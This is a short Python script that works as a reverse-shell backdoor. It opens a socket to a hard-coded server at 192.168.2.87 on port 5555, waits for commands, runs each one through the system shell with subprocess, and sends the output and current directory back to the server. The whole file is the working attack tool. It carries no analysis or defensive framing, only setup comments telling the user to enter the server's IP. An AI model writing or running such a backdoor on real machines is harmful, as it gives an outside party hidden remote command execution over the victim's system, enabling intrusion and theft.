import socket
import os
import subprocess

# from server import transfer

s = socket.socket()
host = "192.168.2.87"  # enter server's IP
port = 5555     # Port number must be same as server

s.connect((host, port))

while True:

    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))


    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        PWD = os.getcwd() + ">"
        s.send(str.encode(output_str + PWD))

        # print(output_str)
